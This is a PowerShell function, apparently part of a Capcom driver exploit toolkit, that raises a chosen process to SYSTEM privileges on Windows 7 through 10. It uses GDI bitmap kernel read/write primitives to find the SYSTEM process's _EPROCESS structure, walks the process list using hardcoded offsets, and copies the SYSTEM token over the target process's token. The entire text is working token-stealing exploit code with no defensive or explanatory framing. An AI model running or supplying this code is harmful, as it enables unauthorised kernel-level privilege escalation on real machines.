function Capcom-ElevatePID {
	param ([Int]$ProcPID)

	# Check our bitmaps have been staged into memory
	if (!$ManagerBitmap -Or !$WorkerBitmap) {
		Capcom-StageGDI
		if ($DriverNotLoaded -eq $true) {
			Return
		}
	}

	# Defaults to elevating Powershell
	if (!$ProcPID) {
		$ProcPID = $PID
	}
	
	# Make sure the pid exists!
	# 0 is also invalid but will default to $PID
	$IsValidProc = ((Get-Process).Id).Contains($ProcPID)
	if (!$IsValidProc) {
		Write-Output "`n[!] Invalid process specified!`n"
		Return
	}

	# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
	# WARNING offsets are invalid for Pre-RTM images!
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			$UniqueProcessIdOffset = 0x2e8
			$TokenOffset = 0x358          
			$ActiveProcessLinks = 0x2f0
		}
	
		'6.3' # Win8.1 / 2k12R2
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.2' # Win8 / 2k12
		{
			$UniqueProcessIdOffset = 0x2e0
			$TokenOffset = 0x348          
			$ActiveProcessLinks = 0x2e8
		}
	
		'6.1' # Win7 / 2k8R2
		{
			$UniqueProcessIdOffset = 0x180
			$TokenOffset = 0x208          
			$ActiveProcessLinks = 0x188
		}
	}

	# Get EPROCESS entry for System process
	$SystemModuleArray = Get-LoadedModules
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
	$KernelHanle = [Capcom]::LoadLibrary("$KernelType")
	$PsInitialSystemProcess = [Capcom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
	$SysEprocessPtr = $PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase
	$CallResult = [Capcom]::FreeLibrary($KernelHanle)
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	Write-Output "`n[+] SYSTEM Token: 0x$("{0:X}" -f $SysToken)"
	
	# Get EPROCESS entry for PID
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $ProcPID) {
			$TargetTokenAddr = $NextProcess+$TokenOffset
			Write-Output "[+] Found PID: $NextPID"
			Write-Output "[+] PID token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}
	
	# Duplicate token!
	Write-Output "[!] Duplicating SYSTEM token!`n"
	Bitmap-Write -Address $TargetTokenAddr -Value $SysToken
}